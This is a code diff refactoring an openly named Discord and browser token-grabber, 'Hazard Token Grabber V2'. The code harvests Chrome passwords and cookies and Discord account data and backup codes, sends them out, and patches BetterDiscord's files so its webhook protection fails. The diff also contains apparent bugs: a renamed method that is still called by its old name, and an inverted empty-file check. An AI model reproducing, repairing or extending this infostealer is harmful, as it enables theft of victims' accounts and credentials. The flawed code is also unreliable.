@@ -34,8 +34,7 @@ class Hazard_Token_Grabber_V2:
         self.discord_psw = []
         self.backup_codes = []
         
-        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
-            self.bypass_better_discord()
+        self.bypass_better_discord()
         self.bypassTokenProtector()
         if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
@@ -50,16 +49,14 @@ class Hazard_Token_Grabber_V2:
         self.neatifyTokens()
         for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
-                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
-                    x = f.read()
-                    if x != "":
+                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
+                    x = ff.read()
+                    if not x:
                         with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                             f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                         with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
-                            fp.write(x)
-                            fp.write("\n\nMade by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2")
+                            fp.write(x+"\n\nMade by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2")
                     else:
-                        f.close()
                         try:
                             os.remove(self.tempfolder+os.sep+i)
                         except Exception:
@@ -67,11 +64,8 @@ class Hazard_Token_Grabber_V2:
 
         self.SendInfo()
         self.Injection()
-        try:
-            shutil.rmtree(self.tempfolder)
-        except (PermissionError, FileNotFoundError):
-            pass
-
+        shutil.rmtree(self.tempfolder)
+        
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
             "Content-Type": content_type,
@@ -144,14 +138,15 @@ class Hazard_Token_Grabber_V2:
         except Exception:
             pass
 
-    def bypass_better_discord(self):
-        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
-        with open(bd, "rt", encoding="cp437") as f:
-            content = f.read()
-            content2 = content.replace("api/webhooks", "RdimoTheGoat")
-        open(bd, "w").close()
-        with open(bd, "wt", encoding="cp437") as f:
-            f.write(content2)
+    def bypassBetterDiscord(self):
+        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
+            bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
+            with open(bd, "rt", encoding="cp437") as f:
+                content = f.read()
+                content2 = content.replace("api/webhooks", "RdimoTheGoat")
+            open(bd, "w").close()
+            with open(bd, "wt", encoding="cp437") as f:
+                f.write(content2)
 
     def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
         def strToInt(x):
